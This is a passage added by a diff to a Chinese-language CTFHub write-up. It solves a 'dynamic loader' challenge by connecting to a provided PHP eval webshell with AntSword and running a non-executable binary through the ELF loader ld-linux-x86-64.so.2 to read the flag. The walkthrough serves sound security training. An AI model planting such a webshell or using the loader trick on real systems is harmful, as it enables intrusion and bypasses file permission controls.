@@ -1341,3 +1341,82 @@ ctfhub{f90b6c76f97124cd83e38e9b}
 在接收到的内容中能看到`cookie : flag=ctfhub{4b7f4238db209b657b3ff69f}`，提交即可。
 
 ------
+
+### 动态加载器
+
+打开靶机后看到以下页面：
+
+> # CTFHub Linux 动态装载
+>
+> 当ELF没有 x 权限时, 如何执行?
+>
+> ```
+> # chmod 755 /readflag
+> # /readflag
+> ctfhub{demoflag}
+> #
+> # chown root:root /readflag
+> # chmod 644 /readflag
+> # ls -l /readflag
+> -rw-r--r-- 1 root root 8648 Mar  6 15:48 /readflag
+> ```
+>
+> ## 目标: 执行 /readflag 读取 flag
+>
+> 出题人: 本题不需要提权, 这是给你的 [WebShell](http://challenge-4311b12ebeb97331.sandbox.ctfhub.com:10800/ant.php), 只能帮你到这了。
+
+靶机给出了`ant.php`，源码如下：
+
+```php
+<?php
+@eval($_REQUEST['ant']);
+show_source(__FILE__);
+?>
+```
+
+通过`AntSword`连接靶机的`webshell`并打开终端，用`ldd`查看到可执行文件的执行链路，发现`/lib64/ld-linux-x86-64.so.2`是当前权限能执行的，我们可以通过它来执行`/readflag`。
+
+```bash
+(*) 基础信息
+当前路径: /var/www/html
+磁盘列表: /
+系统信息: Linux challenge-4311b12ebeb97331-55d57c76c4-tr2mt 5.10.134-12.2.3.lifsea8.x86_64 #1 SMP Thu Apr 20 10:18:02 CST 2023 x86_64
+当前用户: www-data
+(*) 输入 ashelp 查看本地命令
+(www-data:/var/www/html) $ ls
+ant.php
+index.php
+(www-data:/var/www/html) $ ls / -l
+total 84
+drwxr-xr-x   1 root root 4096 Mar  3  2020 bin
+drwxr-xr-x   2 root root 4096 Jun 26  2018 boot
+drwxr-xr-x   5 root root  360 Aug  3 20:54 dev
+drwxr-xr-x   1 root root 4096 Aug  3 20:54 etc
+-rw-------   1 root root   33 Aug  3 20:54 flag
+drwxr-xr-x   2 root root 4096 Jun 26  2018 home
+drwxr-xr-x   1 root root 4096 Jul 17  2018 lib
+drwxr-xr-x   2 root root 4096 Jul 16  2018 lib64
+drwxr-xr-x   2 root root 4096 Jul 16  2018 media
+drwxr-xr-x   2 root root 4096 Jul 16  2018 mnt
+drwxr-x--x   1 root root 4096 Mar  9  2020 opt
+dr-xr-xr-x 178 root root    0 Aug  3 20:54 proc
+-rw-r--r--   1 root root 8648 Mar  9  2020 readflag
+drwx------   1 root root 4096 Mar  9  2020 root
+drwxr-xr-x   1 root root 4096 Aug  3 20:54 run
+drwxr-xr-x   1 root root 4096 Mar  3  2020 sbin
+drwxr-xr-x   2 root root 4096 Jul 16  2018 srv
+dr-xr-xr-x  13 root root    0 Aug  4  2023 sys
+drwxrwxrwt   1 root root 4096 Aug  3 20:54 tmp
+drwxr-xr-x   1 root root 4096 Jul 16  2018 usr
+drwxr-xr-x   1 root root 4096 Jul 17  2018 var
+(www-data:/var/www/html) $ ldd /readflag
+    linux-vdso.so.1 (0x00007ffdfeb3f000)
+    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f040944b000)
+    /lib64/ld-linux-x86-64.so.2 (0x00007f04099ec000)
+(www-data:/var/www/html) $ ls /lib64/ld-linux-x86-64.so.2 -l
+lrwxrwxrwx 1 root root 32 Jan 14  2018 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.24.so
+(www-data:/var/www/html) $ /lib64/ld-linux-x86-64.so.2 /readflag
+ctfhub{de2eb2419998c06d2a75733f}
+```
+
+------
